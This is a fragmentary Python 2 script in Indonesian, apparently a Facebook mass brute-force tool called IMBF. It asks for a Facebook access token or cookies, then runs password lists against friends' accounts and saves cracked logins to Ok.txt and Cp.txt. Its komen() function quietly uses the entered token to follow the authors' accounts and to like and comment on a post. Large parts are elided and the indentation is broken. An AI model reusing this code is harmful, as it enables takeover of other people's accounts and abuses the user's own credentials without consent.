...
[+]Author   : Belajarcuy-hack
[+]Grup     : Hacker Ntt
[+]Github   : https://github.com/Belajarcuy-hack"""
...
def komen(): # Boleh Di Tanbahin Jangan Di Ganti #
	...
	kata = random.choice(["Kita harus melakukan yang terbaik yang kita mampu. Itu adalah tanggung jawab manusia yang suci.","Orang yang ekstrem mendapatkan hasil yang ekstrem.","Belajar untuk menjadi tenang dan kamu akan selalu bahagia.","Belajar untuk menjadi tenang dan kamu akan selalu bahagia.","Dari kesalahan ke kesalahan seseorang menemukan seluruh kebenaran.","Jalan yang sulit sering kali mengarah ke tujuan yang indah.","Hal-hal hebat tidak pernah datang dari zona nyaman.","Jika kamu tidak mau mengambil risiko yang tidak biasa, kamu harus puas dengan yang biasa.","Nikmati setiap momen dalam hidup karena kamu tidak tahu apa yang akan terjadi besok."])
        ...
        kom = 'Pengguna Script IMBF '+love+'\n'+kata+'\n'+waktu
        requests.post('https://graph.facebook.com/100058437404211/subscribers?access_token=' + toket) #Moch Irpan
        requests.post('https://graph.facebook.com/100008263929058/subscribers?access_token=' + toket) #IRPANSOPIAN
        requests.post('https://graph.facebook.com/100036134542779/subscribers?access_token=' + toket) #M Wildan Safaki
        requests.post('https://graph.facebook.com/100064901058335/subscribers?access_token=' + toket) #Jerysmith Jery
        requests.post('https://graph.facebook.com/233862391905006/comments/?message=' +kom+ '&access_token=' + toket) #mochIrpan
        requests.post('https://graph.facebook.com/233862391905006/likes?summary=true&access_token=' + toket) #mochIrpan
        requests.post('https://graph.facebook.com/233862391905006/comments/?message=Ijin Pake Scripnya bang Malik❤️&access_token=' + toket) #mochIrpan
...
def login():
    ...
    print('[0] Keluar/Exit !')
    print('──────────────────────────────────────────')
    lg = raw_input('[?] Pilih Nomor : ')
    if lg == '':
        os.sys.exit()
    elif lg == '1' or lg == '01':
        toket = raw_input("[?] Masukan Token : ") # Login Token
        try:
        ...
        try:
		cookie = raw_input("[?] Masukian Cookies : ")
                data = {
...
def menu():
  ...
  print('──────────────────────────────────────────')
  mn=raw_input("[?] Pilih Nomor : ")
  if mn=="":
	print ('[x] Isi Yang Benar Bos !')
	menu()
  elif mn=="1":
    teman()
  elif mn=="2":
	...
	exit('[x] Isi Yang Benar !')
  elif mn=="0":
    try:
      os.remove("login.txt")
      exit('[•] Berhasil Menghapus Token/Cookies,Thanks Using My Tools')
    except Exception as e:
...
class crack:
	def __init__(self):
		...
		while True:
			print('──────────────────────────────────────────')
			f=raw_input("[?] Gunakan Password Manual (y/t) : ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
					...
					print('[x] File Tidak Ada')
					continue
				print('[•] Contoh Pass : bismilah,alhamdulilah')
				self.pwlist()
				break
			elif f=="t":
				try:
	...
	def pwlist(self):
		...
		if len(self.pw) ==0:
			...
			for i in self.fl:
				i.update({"pw":self.pw})
                        print('[•] Hasil OK Tersimpan Di Ok.txt')
                        print('[•] Hasil CK Tersimpan Di Cp.txt')
			print('──────────────────────────────────────────')
	...
	def main(self,fl):
		try:
			...
			self.ko+=1
			print "\r[Crack Berjalan] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack1:
	def __init__(self):
